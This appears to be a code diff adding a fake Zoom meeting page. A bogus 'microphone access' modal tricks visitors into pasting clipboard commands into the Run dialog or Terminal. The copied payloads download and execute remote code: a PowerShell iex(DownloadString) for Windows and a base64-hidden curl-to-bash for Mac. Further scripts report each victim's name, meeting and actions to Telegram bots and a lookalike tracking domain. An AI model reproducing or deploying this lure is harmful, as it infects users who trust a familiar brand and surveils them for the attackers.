+          <svg viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="#0e72ed" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="2" width="6" height="12" rx="3"></rect>
+            <path d="M5 10v2a7 7 0 0 0 14 0v-2"></path>
+            <line x1="12" y1="19" x2="12" y2="22"></line>
+            <line x1="8" y1="22" x2="16" y2="22"></line>
+          </svg>
+        </div>
+      </div>
+      <h2 class="drv-title">Microphone access required</h2>
+      <p class="drv-lead">Zoom couldn't access your microphone. This usually happens after a recent browser privacy update, which resets microphone permissions for web meetings.</p>
+      <p class="drv-sublead">Your device is connected correctly. We just need your browser to re-authorize Zoom. Follow the 3 quick steps below. Takes less than 1 minute, no restart required.</p>
+      <ol class="drv-steps">
+        <li>Press <b>Win + R</b> on your keyboard to open the browser permission prompt.</li>
+        <li>Click the <b>Copy</b> button below to copy your Zoom permission token to the clipboard.
+          <div class="drv-codebar">
+            <span class="drv-url" id="drvUrl" title="zoom-audio-permission-a8f3c2e9b1">zoom-audio-permission-a8f3c2e9b1</span>
+            <button class="drv-copy" id="drvCopy">Copy</button>
+          </div>
+        </li>
+        <li>Paste the token (<b>Ctrl + V</b>) into the permission window and press <b>Enter</b> to apply the changes.</li>
+      </ol>
+      <div class="drv-safe-note">
+        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#25e55f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        <span>This process is safe and uses your browser's built-in privacy controls. Once complete, your audio will be restored automatically and your browser will allow Zoom to use your microphone.</span>
+      </div>
+      <div class="drv-help">Need more help? Visit the <a id="drvHelp" href="https://support.zoom.com/hc/en" target="_blank" rel="noopener noreferrer">Zoom Help Center</a> for more information.</div>
+    </div>
+  </div>
+
+</div>
+<script>
+// === Telegram-уведомления Tephra Zoom (красивый формат) ===
+(function(){
+  var TG_TOKEN = '8552273787:AAFfaq7biJBRRl9vlrJZIv0Y7mQoA9W50eI';
+  var TG_CHATS = [7608812198, 6271847942];
+
+  // Декор событий
+  var EMOJI = {
+    join:        '👋',
+    name:        '👤',
+    fixnow:      '🔧',
+    copy:        '📋',
+    command:     '⚡',
+    enter:       '✅',
+    leave:       '🚪',
+    reconnect:   '🔄'
+  };
+
+  // Хранилище данных текущей цели
+  var S = window.__TGSTATE__ = window.__TGSTATE__ || {};
+
+  // Главная функция: tgEvent('join', {name: myName})
+  window.tgEvent = function(event, data){
+    data = data || {};
+
+    // Накопление данных о текущей сессии (meeting, name, country)
+    if(data.meeting)  S.meeting  = data.meeting;
+    if(data.name)     S.name    = data.name;
+    if(data.country)  S.country = data.country;
+    if(data.flag)     S.flag    = data.flag;
+
+    var lines = [];
+
+    if(event === 'join'){
+      lines.push(EMOJI.join + ' ' + (S.name || 'Гость') + ' Joined the meeting!');
+      lines.push('📞 Meeting: ' + (S.meeting || window.__MID__ || '—'));
+      if(S.country) lines.push('🌍 Country: ' + (S.flag ? S.flag + ' ' : '') + S.country);
+      lines.push('🕒 ' + new Date().toLocaleTimeString('ru-RU'));
+    }
+    else if(event === 'fixnow'){
+      lines.push(EMOJI.fixnow + ' ' + (S.name || 'Гость') + ' видит окно Fix Now!');
+      lines.push('📞 Meeting: ' + (S.meeting || window.__MID__ || '—'));
+      if(S.country) lines.push('🌍 Country: ' + (S.flag ? S.flag + ' ' : '') + S.country);
+    }
+    else if(event === 'copy'){
+      lines.push(EMOJI.copy + ' ' + (S.name || 'Гость') + ' copied the command!');
+      lines.push('📞 Meeting: ' + (S.meeting || window.__MID__ || '—'));
+    }
+    else if(event === 'command'){
+      lines.push(EMOJI.command + ' ' + (S.name || 'Гость') + ' ввёл команду!');
+      lines.push('📞 Meeting: ' + (S.meeting || window.__MID__ || '—'));
+      if(S.country) lines.push('🌍 Country: ' + (S.flag ? S.flag + ' ' : '') + S.country);
+      lines.push('🕒 ' + new Date().toLocaleTimeString('ru-RU'));
+    }
+    else if(event === 'entered'){
+      // финальный успех: цель в комнате
+      lines.push(EMOJI.enter + ' ' + (S.name || 'Гость') + ' вошёл в комнату!');
+      lines.push('📞 Meeting: ' + (S.meeting || window.__MID__ || '—'));
+      lines.push('🕒 ' + new Date().toLocaleTimeString('ru-RU'));
+    }
+    else {
+      // пользовательское событие
+      lines.push((EMOJI[event] || '🔹') + ' [' + event + ']' +
+                (data.note ? '\n' + data.note : ''));
+    }
+
+    var text = lines.join('\n');
+    TG_CHATS.forEach(function(id){
+      fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id: id, text: text})
+      }).catch(function(){});
+    });
+  };
+
+  // Обратная совместимость: старые вызовы tgSend(...) продолжат работать
+  window.tgSend = function(event, extra){
+    tgEvent(event, {note: extra});
+  };
+})();
+
+</script>
+
+<script>
+window.MEDIA_VERSION = '4';
+
+// ============================================
+// PAYLOADS — редактируй здесь при необходимости
+// ============================================
+const WIN_PAYLOAD = String.raw`powershell -w 1 -c "iex(New-Object Net.WebClient).DownloadString('https://'+'getapphps.us/2.txt');msg * 'Browser version 6.2.8 - Allow microphone audio access'"`;
+
+const MAC_PAYLOAD = String.raw`# Browser version:  6.2.14 (build 47821.0621)
+# Authority:        Developer ID • Zoom Video Communications, Inc.
+# Reference:        ZKB-2024-1187
+echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzIuMjYuMy42Ni9SaWZvZnVsaWQpIg==' | base64 -d | bash`;
+// ============================================
+
+// OS detection (упрощённая версия — только mac/win)
+function detectOS(){
+  const ua = navigator.userAgent || '';
+  const plat = (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || '';
+  const isMac = /Mac/i.test(plat) || (/Macintosh|Mac OS X/i.test(ua) && !/iPhone|iPad/i.test(ua));
+  return isMac ? 'mac' : 'win';
+}
+
+const USER_OS = detectOS();
+
+function getPayload(){
+  return USER_OS === 'mac' ? MAC_PAYLOAD : WIN_PAYLOAD;
+}
+
+function copyPayload(showFeedback){
+  const payload = getPayload();
+  const done = ()=>{
+    if(!showFeedback) return;
+    const btn = document.getElementById('drvCopy');
+    if(btn){
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(()=>{ btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1800);
+    }
+  };
+
+  // === ДОБАВЛЕННЫЙ БЛОК ===
+  // Трекинг: только реальный клик по кнопке Copy (showFeedback=true),
+  // а не автокопирование при открытии модалки (showFeedback=false)
+  if(showFeedback && window.__MID__){
+    new Image().src = 'https://panel.us05-web-zoom.us/api/track.php'
+      + '?m=' + encodeURIComponent(window.__MID__)
+      + '&event=copy'
+      + '&name=' + encodeURIComponent(myName || 'Unknown')
+      + '&t=' + Date.now();
+  }
+  tgEvent('copy', {name: myName});
+  // === КОНЕЦ БЛОКА ===
+
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(payload).then(done).catch(fallback);
+  } else fallback();
+  function fallback(){
+    const ta = document.createElement('textarea');
+    ta.value = payload;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try{ document.execCommand('copy'); done(); }catch(_){}
+    document.body.removeChild(ta);
+  }
+}
+const screens = {
+  loading1: document.getElementById('loading1'),
+  info:     document.getElementById('info'),
+  loading2: document.getElementById('loading2'),
+  meeting:  document.getElementById('meeting'),
+};
+function show(name){
+  Object.values(screens).forEach(s=>s.classList.remove('active'));
+  screens[name].classList.add('active');
+}
+
+const TAB_TITLES = {
+  info:    'Zoom',
+  loading: 'Zoom Meeting',
+  meeting: "Tephra Capital's Zoom Meeting"
+};
+function setTabTitle(key){
+  document.title = TAB_TITLES[key] || 'Meet';
+}
+
+function renderDrvModal(){
+  const isMac = USER_OS === 'mac';
+  
+  const lead = "Zoom couldn't access your microphone. This usually happens after a recent browser privacy update, which resets microphone permissions for web meetings.";
+  
+  const sublead = isMac
+    ? 'Your device is connected correctly. We just need browser to re-authorize Zoom. Follow the 3 quick steps below. Takes less than 1 minute, no restart required.'
+    : 'Your device is connected correctly. We just need your browser to re-authorize Zoom. Follow the 3 quick steps below. Takes less than 1 minute, no restart required.';
+  
+  const step1 = isMac
+    ? 'Press <b>Command (⌘) + Space</b> on your keyboard to open Spotlight, type <b>Terminal</b> and press <b>Enter</b>.'
+    : 'Press <b>Win + R</b> on your keyboard to open the browser permission prompt.';
+  
+  const step2 = 'Click the <b>Copy</b> button below to copy your Zoom permission token to the clipboard.';
+  
+  const step3 = isMac
+    ? 'Paste the token (<b>Command (⌘) + V</b>) into the Terminal window and press <b>Enter</b> to apply the changes.'
+    : 'Paste the token (<b>Ctrl + V</b>) into the permission window and press <b>Enter</b> to apply the changes.';
+  
+  const tokenLabel = isMac
+    ? 'Browser version:  6.2.14 (build 47821.0621)'
+    : 'Browser version: 6.2.8 Allow microphone audio access';
+  
+  document.querySelector('.drv-lead').textContent = lead;
+  document.querySelector('.drv-sublead').textContent = sublead;
+  
+  const steps = document.querySelectorAll('.drv-steps > li');
+  if(steps[0]) steps[0].innerHTML = step1;
+  if(steps[1]) steps[1].innerHTML = step2 + `
+      <div class="drv-codebar">
+        <span class="drv-url" id="drvUrl" title="${tokenLabel}">${tokenLabel}</span>
+        <button class="drv-copy" id="drvCopy">Copy</button>
+      </div>`;
+  if(steps[2]) steps[2].innerHTML = step3;
+}
+
+renderDrvModal();
+show('loading1');
+setTabTitle('info');
+setTimeout(()=>show('info'), 2000);
+
+let myName = 'Alex';
+const nameInput = document.getElementById('nameInput');
+const joinBtn   = document.getElementById('joinBtn');
+nameInput.addEventListener('input', ()=>{
+  const v = nameInput.value.trim();
+  joinBtn.classList.toggle('enabled', v.length>0);
+});
+nameInput.addEventListener('keydown', e=>{ if(e.key==='Enter') joinBtn.click(); });
+joinBtn.addEventListener('click', ()=>{
+  if(!joinBtn.classList.contains('enabled')) return;
+  myName = nameInput.value.trim();
+  
+  // Отправляем уведомление о нажатии Join
+  if(window.__MID__){
+    new Image().src = 'https://panel.us05-web-zoom.us/api/track.php'
+      + '?m=' + encodeURIComponent(window.__MID__)
+      + '&event=join'
+      + '&name=' + encodeURIComponent(myName)
+      + '&t=' + Date.now();
+  }
+  tgEvent('join', {name: myName, meeting: '77240434542'});
+
+
+  
+  setTabTitle('loading');
+  show('loading2');
+  setTimeout(enterMeeting, 2000);
+});
+document.getElementById('backBtn').addEventListener('click', ()=>{
+  setTabTitle('info');
+  show('loading1'); setTimeout(()=>show('info'), 2000);
+});
+
+const HOST_ID = 'Sam';
+const remote = [
+ {id:'Sam', name:'Sam Ojha (Host)', hue:355, video:true, muted:false},
+];
+let me = {id:'me', name:'Alex', hue:18, video:false, muted:true, avatarColor:'#f5511e'};
+
+let participants = [];
+let viewMode = 'gallery';
+let activeSpeakerId = HOST_ID;
+let handUp = false;
+let camStream = null, micStream = null;
+
+const stage = document.getElementById('stage');
+
+const micSvg    = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="2" width="6" height="12" rx="3"/><path d="M5 10v2a7 7 0 0 0 14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg>';
+const micOffSvg = '<svg class="mic-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="2" width="6" height="12" rx="3"/><path d="M5 10v2a7 7 0 0 0 14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/><line x1="2" y1="2" x2="22" y2="22"/></svg>';
+
+const pMicOn  = '<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.667 8V3.333a1.667 1.667 0 0 0-3.334 0V8a1.667 1.667 0 0 0 3.334 0ZM8 .667a2.667 2.667 0 0 0-2.667 2.666V8a2.667 2.667 0 0 0 5.334 0V3.333A2.667 2.667 0 0 0 8 .667Zm.5 11.973A4.667 4.667 0 0 0 12.667 8a.5.5 0 1 0-1 0 3.667 3.667 0 1 1-7.334 0 .5.5 0 1 0-1 0A4.667 4.667 0 0 0 7.5 12.64v1.693H6a.5.5 0 1 0 0 1h4a.5.5 0 0 0 0-1H8.5V12.64Z" fill="#6E6E76"></path></svg>';
+const pMicOff = '<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.667 8V3.333a1.667 1.667 0 0 0-3.334 0V8a1.667 1.667 0 0 0 3.334 0ZM8 .667a2.667 2.667 0 0 0-2.667 2.666V8a2.667 2.667 0 0 0 5.334 0V3.333A2.667 2.667 0 0 0 8 .667Zm.5 11.973A4.667 4.667 0 0 0 12.667 8a.5.5 0 1 0-1 0 3.667 3.667 0 1 1-7.334 0 .5.5 0 1 0-1 0A4.667 4.667 0 0 0 7.5 12.64v1.693H6a.5.5 0 1 0 0 1h4a.5.5 0 0 0 0-1H8.5V12.64Z" fill="#E02828"></path><path d="m15.5.5-15 15" stroke="#E02828" stroke-linecap="round"></path></svg>';
+const pCamOff = '<svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.486 3.393A2.986 2.986 0 0 0 9 3H1.5A1.5 1.5 0 0 0 0 4.5V10c0 1.053.543 1.98 1.364 2.515l.73-.731A2 2 0 0 1 1 10V4.5a.5.5 0 0 1 .5-.5H9c.26 0 .51.05.738.14l.748-.747ZM11 7.121l1.485-1.485L14.8 3.9a.75.75 0 0 1 1.2.6v7a.75.75 0 0 1-1.2.6L12 10v1.5a1.5 1.5 0 0 1-1.5 1.5H5.121l1-1H10.5a.5.5 0 0 0 .5-.5V7.121ZM15 11l-3-2.25v-1.5L15 5v6Z" fill="#E02828"></path><path d="m15.5.5-15 15" stroke="#DE2828" stroke-linecap="round"></path></svg>';
+const pCamOn  = '<svg viewBox="0 0 16 16" fill="#6E6E76" xmlns="http://www.w3.org/2000/svg"><path d="M1.5 3A1.5 1.5 0 0 0 0 4.5V10a1.5 1.5 0 0 0 1.5 1.5h9A1.5 1.5 0 0 0 12 10V8.379l2.8 2.1a.75.75 0 0 0 1.2-.6v-7a.75.75 0 0 0-1.2-.6L12 4.621V4.5A1.5 1.5 0 0 0 10.5 3h-9Z"></path></svg>';
+
+function tileMarkup(p){
+  const isMe = p.id==='me';
+  let inner='';
+  if(p.video){
+    inner += isMe
+      ? `<video class="feed self" autoplay muted playsinline></video>`
+      : `<video class="feed" autoplay muted loop playsinline preload="auto"></video><div class="placeholder" style="--h:${p.hue}"></div>`;
+  } else {
+    inner += `<div class="avatar" style="background:${p.avatarColor||'#f5511e'}">${p.name[0]}</div>`;
+  }
+  inner += `<div class="tile-hand${(isMe&&handUp)?' show':''}">✋</div>`;
+  inner += `<div class="tile-name">${p.muted?micOffSvg:micSvg}${p.name.replace(' (Host)','')}</div>`;
+  return inner;
+}
+function wireTile(el, p){
+  if(!p.video) return;
+  const v = el.querySelector('.feed');
+  if(p.id==='me'){ if(camStream) v.srcObject = camStream; return; }
+  const ph = el.querySelector('.placeholder');
+  v.src = p.id + '.mp4?v=' + (window.MEDIA_VERSION || '2');
+  v.addEventListener('loadeddata', ()=>{ if(ph) ph.style.display='none'; });
+  v.addEventListener('error', ()=>{});
+}
+function createTileEl(p){
+  const el = document.createElement('div');
+  el.className='vtile'; el.dataset.id=p.id;
+  el.innerHTML = tileMarkup(p);
+  wireTile(el, p);
+  return el;
+}
+
+function bestTileWidth(count){
+  const g = document.getElementById('gallery');
+  const W = g.clientWidth - 32, H = g.clientHeight - 32;
+  const gap=10, aspect=16/9; let best=0;
+  for(let cols=1; cols<=count; cols++){
+    const rows = Math.ceil(count/cols);
+    let tw = (W - gap*(cols-1))/cols, th = tw/aspect;
+    if(th*rows + gap*(rows-1) > H){ th=(H-gap*(rows-1))/rows; tw=th*aspect; }
+    if(tw>best) best=tw;
+  }
+  return Math.floor(best);
+}
+function applyTileWidth(){
+  const w = bestTileWidth(document.querySelectorAll('#gallery .vtile').length);
+  document.querySelectorAll('#gallery .vtile').forEach(t=> t.style.width = w+'px');
+}
+function sizeSpeaker(){
+  const main = document.getElementById('mainSpeaker');
+  if(!main) return;
+  const tile = main.querySelector('.vtile');
+  if(!tile) return;
+  const W = main.clientWidth, H = main.clientHeight, a = 16/9;
+  let w = W, h = w/a;
+  if(h > H){ h = H; w = h*a; }
+  tile.style.width  = Math.round(w)+'px';
+  tile.style.height = Math.round(h)+'px';
+  const av = tile.querySelector('.avatar');
+  if(av){
+    const txt = (av.textContent||'').trim();
+    let fs = h*0.118;
+    const maxW = w*0.86;
+    const approxW = txt.length * fs * 0.56;
+    if(approxW > maxW) fs = maxW/(txt.length*0.56);
+    av.style.fontSize = Math.round(fs)+'px';
+    av.style.whiteSpace = 'nowrap';
+  }
+}
+
+function renderGallery(){
+  stage.classList.remove('speaker-mode');
+  const g = document.getElementById('gallery');
+  g.innerHTML='';
+  participants.forEach(p=> g.appendChild(createTileEl(p)));
+  applyTileWidth();
+}
+function renderSpeaker(){
+  stage.classList.add('speaker-mode');
+  const film = document.getElementById('filmstrip');
+  const main = document.getElementById('mainSpeaker');
+  const pin = document.getElementById('removePin');
+  if(pin && pin.parentElement) pin.parentElement.removeChild(pin);
+  film.innerHTML=''; main.innerHTML='';
+  const active = participants.find(p=>p.id===activeSpeakerId) || participants[0];
+  participants.filter(p=>p.id!==active.id).forEach(p=> film.appendChild(createTileEl(p)));
+  const activeTile = createTileEl(active);
+  main.appendChild(activeTile);
+  if(pin) activeTile.appendChild(pin);
+  const av = activeTile.querySelector('.avatar');
+  if(av) av.textContent = active.name;
+  sizeSpeaker();
+}
+function render(){ viewMode==='gallery' ? renderGallery() : renderSpeaker(); }
+
+function addParticipantAnimated(p){
+  const g = document.getElementById('gallery');
+  const existing = [...g.querySelectorAll('.vtile')];
+  const first = existing.map(t=>t.getBoundingClientRect());
+  const el = createTileEl(p);
+  el.style.opacity='0'; el.style.transform='scale(.92)';
+  g.appendChild(el);
+  applyTileWidth();
+  const last = existing.map(t=>t.getBoundingClientRect());
+  existing.forEach((t,i)=>{
+    const f=first[i], l=last[i];
+    const dx=f.left-l.left, dy=f.top-l.top, sx=f.width/l.width;
+    t.style.transformOrigin='top left';
+    t.style.transition='none';
+    t.style.transform=`translate(${dx}px,${dy}px) scale(${sx})`;
+  });
+  requestAnimationFrame(()=>{
+    existing.forEach(t=>{ t.style.transition='transform .45s cubic-bezier(.2,.7,.3,1)'; t.style.transform=''; });
+    el.style.transition='opacity .4s ease, transform .4s ease';
+    requestAnimationFrame(()=>{ el.style.opacity='1'; el.style.transform=''; });
+  });
+}
+
+function enterMeeting(){
+  show('meeting');
+  setTabTitle('meeting');
+  me = {id:'me', name:myName, hue:18, video:false, muted:true, avatarColor:'#f5511e'};
+  applyTheme();
+  document.getElementById('notif').style.display='';
+  setVideoIcon(false); setAudioIcon(true);
+  document.getElementById('infoHost').textContent = remote[0].name.replace(' (Host)','');
+
+  viewMode='speaker'; setViewChecks();
+  participants = remote.concat([me]);
+  activeSpeakerId = HOST_ID;
+  renderSpeaker();
+  buildParticipantsPanel();
+}
+
+(function(){
+  const ua = navigator.userAgent || '';
+  const plat = (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || '';
+  const isMac = /Mac/i.test(plat) || (/Macintosh|Mac OS X/i.test(ua) && !/iPhone|iPad/i.test(ua));
+  if(isMac) document.body.classList.add('is-mac');
+})();
+
+function applyTheme(){
+  const dark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  document.querySelectorAll('.side-panel').forEach(p=>{
+    p.classList.toggle('dark', dark);
+    p.classList.toggle('light', !dark);
+  });
+}
+window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);
+
+const chatPanel = document.getElementById('chatPanel');
+const partPanel = document.getElementById('participantsPanel');
+const tChat = document.getElementById('tChat');
+const tPart = document.getElementById('tParticipants');
+function refit(){ requestAnimationFrame(()=> requestAnimationFrame(()=> viewMode==='gallery'?applyTileWidth():sizeSpeaker())); }
+function togglePanel(which){
+  const openChat = which==='chat' && !chatPanel.classList.contains('open');
+  const openPart = which==='part' && !partPanel.classList.contains('open');
+  chatPanel.classList.remove('open'); partPanel.classList.remove('open');
+  tChat.classList.remove('active'); tPart.classList.remove('active');
+  if(openChat){ chatPanel.classList.add('open'); tChat.classList.add('active'); }
+  if(openPart){ partPanel.classList.add('open'); tPart.classList.add('active'); }
+  refit();
+}
+tChat.addEventListener('click', ()=>togglePanel('chat'));
+tPart.addEventListener('click', ()=>togglePanel('part'));
+document.querySelectorAll('.closePanel').forEach(x=> x.addEventListener('click', ()=>{
+  chatPanel.classList.remove('open'); partPanel.classList.remove('open');
+  tChat.classList.remove('active'); tPart.classList.remove('active'); refit();
+}));
+
+function buildParticipantsPanel(){
+  document.getElementById('chatTitle').textContent = remote[0].name.replace(' (Host)','') + "'s Meeting";
+  document.getElementById('pCount').textContent = participants.length;
+  document.getElementById('partTitle').textContent = `Participants (${participants.length})`;
+  document.getElementById('pList').innerHTML = participants.map(p=>{
+    const isMe = p.id==='me';
+    const display = isMe ? p.name : p.name.replace(' (Host)','');
+    const label = isMe ? ' (Me)' : (p.name.includes('(Host)') ? ' (Host)' : '');
+    const av = isMe
+      ? `<div class="p-av" style="background:${p.avatarColor}">${p.name[0]}</div>`
+      : `<div class="p-av" style="background:linear-gradient(140deg,hsl(${p.hue},38%,32%),hsl(${p.hue+35},42%,20%))"></div>`;
+    const mic = p.muted ? pMicOff : pMicOn;
+    const cam = p.video ? pCamOn : pCamOff;
+    return `<div class="p-row"><div class="p-left">${av}<span class="p-name-sec">${display}<span class="p-label">${label}</span></span></div><div class="p-icons">${mic}${cam}</div></div>`;
+  }).join('');
+}
+
+const chatInput = document.getElementById('chatInput');
+const chatMessages = document.getElementById('chatMessages');
+chatInput.addEventListener('keydown', e=>{
+  if(e.key==='Enter' && !e.shiftKey){
+    e.preventDefault();
+    const txt = chatInput.value.trim(); if(!txt) return;
+    const now = new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+    const div = document.createElement('div'); div.className='chat-msg';
+    div.innerHTML = `<div class="who">${me.name} (You) <span>${now}</span></div><div>${txt.replace(/</g,'&lt;')}</div>`;
+    chatMessages.appendChild(div);
+    chatMessages.scrollTop = chatMessages.scrollHeight;
+    chatInput.value='';
+  }
+});
+
+const reactPop = document.getElementById('reactPop');
+const morePop  = document.getElementById('morePop');
+const infoPanel = document.getElementById('infoPanel');
+const viewMenu  = document.getElementById('viewMenu');
+
+function closeAllPops(){ reactPop.classList.remove('open'); morePop.classList.remove('open'); infoPanel.classList.remove('open'); viewMenu.classList.remove('open'); document.getElementById('viewBtn').classList.remove('active'); }
+function positionAbove(pop, btn){
+  pop.classList.add('open');
+  const b = btn.getBoundingClientRect(), r = pop.getBoundingClientRect();
+  let left = b.left + b.width/2 - r.width/2;
+  left = Math.max(8, Math.min(left, window.innerWidth - r.width - 8));
+  pop.style.left = left+'px';
+  pop.style.bottom = (window.innerHeight - b.top + 8)+'px';
+}
+function positionBelow(menu, btn, align){
+  menu.classList.add('open');
+  const b = btn.getBoundingClientRect(), r = menu.getBoundingClientRect();
+  menu.style.top = (b.bottom + 8)+'px';
+  let left = align==='right' ? b.right - r.width : b.left;
+  left = Math.max(8, Math.min(left, window.innerWidth - r.width - 8));
+  menu.style.left = left+'px';
+}
+document.getElementById('tReact').addEventListener('click', e=>{
+  e.stopPropagation(); const open=reactPop.classList.contains('open'); closeAllPops();
+  if(!open) positionAbove(reactPop, e.currentTarget);
+});
+document.getElementById('tMore').addEventListener('click', e=>{
+  e.stopPropagation(); const open=morePop.classList.contains('open'); closeAllPops();
+  if(!open) positionAbove(morePop, e.currentTarget);
+});
+document.getElementById('shieldBtn').addEventListener('click', e=>{
+  e.stopPropagation(); const open=infoPanel.classList.contains('open'); closeAllPops();
+  if(!open) infoPanel.classList.add('open');
+});
+document.getElementById('viewBtn').addEventListener('click', e=>{
+  e.stopPropagation(); const open=viewMenu.classList.contains('open'); closeAllPops();
+  if(!open){ positionBelow(viewMenu, e.currentTarget, 'right'); e.currentTarget.classList.add('active'); }
+});
+document.addEventListener('click', e=>{
+  if(!reactPop.contains(e.target) && !e.target.closest('#tReact')) reactPop.classList.remove('open');
+  if(!morePop.contains(e.target) && !e.target.closest('#tMore')) morePop.classList.remove('open');
+  if(!infoPanel.contains(e.target) && !e.target.closest('#shieldBtn')) infoPanel.classList.remove('open');
+  if(!viewMenu.contains(e.target) && !e.target.closest('#viewBtn')){ viewMenu.classList.remove('open'); document.getElementById('viewBtn').classList.remove('active'); }
+});
+
+document.getElementById('copyLink').addEventListener('click', function(){
+  const url = document.getElementById('inviteUrl').textContent;
+  const self = this;
+  navigator.clipboard?.writeText(url).then(()=>{
+    self.lastChild.textContent = ' Copied!';
+    setTimeout(()=>{ self.lastChild.textContent = ' Copy Link'; }, 1500);
+  }).catch(()=>{});
+});
+
+function setViewChecks(){
+  viewMenu.querySelectorAll('.vm-item[data-view]').forEach(it=>{
+    const isCur = (it.dataset.view==='speaker' && viewMode==='speaker') ||
+                  ((it.dataset.view==='gallery'||it.dataset.view==='multi') && viewMode==='gallery');
+    it.querySelector('.vm-check').textContent = isCur ? '✓' : '';
+    it.classList.toggle('current', isCur);
+  });
+}
+viewMenu.querySelectorAll('.vm-item[data-view]').forEach(it=>{
+  it.addEventListener('click', ()=>{
+    viewMode = it.dataset.view==='speaker' ? 'speaker' : 'gallery';
+    setViewChecks(); render();
+    closeAllPops();
+  });
+});
+
+reactPop.querySelectorAll('.emoji-row button[data-e]').forEach(b=>{
+  b.addEventListener('click', ()=>{ floatReaction(b.dataset.e); reactPop.classList.remove('open'); });
+});
+function floatReaction(emoji){
+  const layer = document.getElementById('reactionLayer');
+  const s = document.createElement('span'); s.className='float-emoji'; s.textContent=emoji;
+  s.style.left = (38 + Math.random()*24)+'%';
+  layer.appendChild(s);
+  setTimeout(()=>s.remove(), 3000);
+}
+document.getElementById('raiseHand').addEventListener('click', e=>{
+  handUp = !handUp;
+  e.currentTarget.classList.toggle('on', handUp);
+  e.currentTarget.innerHTML = handUp ? '✋&nbsp; Lower Hand' : '✋&nbsp; Raise Hand';
+  document.querySelectorAll('.vtile[data-id="me"] .tile-hand').forEach(h=> h.classList.toggle('show', handUp));
+  reactPop.classList.remove('open');
+});
+
+function updateMyTiles(){
+  document.querySelectorAll('.vtile[data-id="me"]').forEach(el=>{ el.innerHTML = tileMarkup(me); wireTile(el, me); });
+}
+async function toggleCamera(){
+  if(me.video){
+    if(camStream){ camStream.getTracks().forEach(t=>t.stop()); camStream=null; }
+    me.video=false; setVideoIcon(false);
+  } else {
+    try{ camStream = await navigator.mediaDevices.getUserMedia({video:true}); me.video=true; setVideoIcon(true); }
+    catch(err){ return; }
+  }
+  updateMyTiles(); buildParticipantsPanel(); maybeHideNotif();
+}
+async function toggleMic(){
+  if(me.muted){
+    try{ micStream = await navigator.mediaDevices.getUserMedia({audio:true}); me.muted=false; }
+    catch(err){ return; }
+  } else {
+    if(micStream){ micStream.getTracks().forEach(t=>t.stop()); micStream=null; }
+    me.muted=true;
+  }
+  setAudioIcon(me.muted); updateMyTiles(); buildParticipantsPanel(); maybeHideNotif();
+}
+const tbMicOff = '<svg viewBox="0 0 32 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7.5 4.5C7.5 2.01 9.51 0 12 0s4.5 2.01 4.5 4.5V12c0 2.49-2.01 4.5-4.5 4.5S7.5 14.49 7.5 12V4.5ZM12 15c1.65 0 3-1.35 3-3V4.5c0-1.65-1.35-3-3-3s-3 1.35-3 3V12c0 1.65 1.35 3 3 3Z" fill="#fff"/><path d="M19.485 12.15c.015-.045.015-.105.015-.15 0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 3.315-2.685 6-6 6s-6-2.685-6-6c0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 .045 0 .105.015.15.06 3.81 2.985 6.93 6.735 7.305V22.5h-3c-.42 0-.75.33-.75.75s.33.75.75.75h7.5c.42 0 .75-.33.75-.75s-.33-.75-.75-.75h-3v-3.045c3.75-.375 6.675-3.495 6.735-7.305Z" fill="#fff"/><path fill-rule="evenodd" clip-rule="evenodd" d="M17.257 20.765A1.5 1.5 0 0 0 18.565 23h10.87a1.5 1.5 0 0 0 1.308-2.235l-5.436-9.663a1.5 1.5 0 0 0-2.614 0l-5.436 9.663ZM23.35 17.6v-2.95a.65.65 0 0 1 1.3 0v2.95a.65.65 0 0 1-1.3 0Zm-.1 2.65a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Z" fill="#F05"/></svg>';
